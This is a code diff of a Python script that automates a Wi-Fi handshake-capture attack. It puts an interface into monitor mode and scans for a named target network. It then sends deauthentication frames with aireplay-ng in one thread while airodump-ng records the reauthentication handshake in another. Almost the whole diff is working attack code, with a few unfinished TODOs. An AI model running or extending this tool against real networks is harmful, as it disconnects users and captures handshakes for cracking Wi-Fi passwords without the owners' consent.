@@ -26,13 +26,23 @@ def put_interface_in_same_channel(iface: str, channel: str):
     iface_up_output = subprocess.run(cmd, capture_output=True, text=True)
     print(iface_up_output.stdout)
 
-def send_deauths(iface: str, mac_address: str, channel: str):
-    # TODO: figure out how to get the channel to pass to this function
-    put_interface_in_same_channel(iface, "6")
-    
-    cmd = ["sudo", "aireplay-ng", "--deauth", channel, "-a", mac_address, iface]
+def start_airodump(airodump_args, stop_event):
+    cmd = ["sudo", "airodump-ng", "-w", airodump_args["cap_file_name"], "-c", str(airodump_args["channel"]), "--bssid", airodump_args["bssid"], airodump_args["interface"]]
     result = subprocess.run(cmd, capture_output=True, text=True)
+    # while not stop_event.is_set():
     print(result.stdout)
+    return
+    
+def send_deauths(aireplay_args, stop_event):
+    # TODO: figure out how to get the channel to pass to this function
+    put_interface_in_same_channel(aireplay_args["interface"], "6")
+    
+    cmd = ["sudo", "aireplay-ng", "--deauth", str(aireplay_args["deauths"]), "-a", aireplay_args["bssid"], aireplay_args["interface"]]
+    result = subprocess.run(cmd, capture_output=True, text=True)
+
+    # while not stop_event.is_set():
+    print(result.stdout)
+    return
 
 def kill_conflicting_processes():
     subprocess.run(["sudo", "airmon-ng", "check", "kill"], capture_output=True, text=True, check=True)
@@ -81,7 +91,7 @@ def find_network(
 
     try:
         while proc.poll() is None:
-            if timeout and (time.time() - start) > timeout:
+            if timeout and (time.time() - int(start)) > int(timeout):
                 print("\nTimeout reached – stopping scan.")
                 break
 
@@ -164,16 +174,35 @@ def main():
     logging.info("Interface: %s", args.interface)
     logging.info("Capture File: %s", args.capfile)
 
-    # TODO: make script smart enough to figure this out on its own
-    channel = 1
-
     kill_conflicting_processes()
     enable_monitor_mode(args.interface)
-    network_info = find_network(args.target, args.interface, 20)
+    network_info = find_network(args.target, args.interface, "20")
     print(network_info)
     
     if network_info:
-        send_deauths(args.interface, str(network_info['bssid']), str(network_info['channel']))
+        stop_event = threading.Event()
+        
+        # In its own thread, send 20 deauths by default TODO: make this value a command line arg
+        aireplay_args = { "interface": args.interface, "bssid": network_info["bssid"], "deauths": "20" }
+        # deauth_thread = threading.Thread(target=send_deauths, args={aireplay_args, stop_event})
+        
+        
+        # In second thread, capture the automatic reauthentication attempt
+        airodump_args = { "cap_file_name": args.capfile, "channel": network_info["channel"], "bssid": network_info["bssid"], "interface": args.interface }
+        # airodump_thread = threading.Thread(target=start_airodump, args={airodump_args, stop_event})
+
+        deauth_thread = threading.Thread(target=send_deauths, args=(aireplay_args, stop_event))
+        airodump_thread = threading.Thread(target=start_airodump, args=(airodump_args, stop_event))
+
+        deauth_thread.start()
+        airodump_thread.start()
+        
+        time.sleep(10)
+        
+        stop_event.set()
+        deauth_thread.join()
+        airodump_thread.join()
+        
 
 if __name__ == "__main__":
     logging.basicConfig(
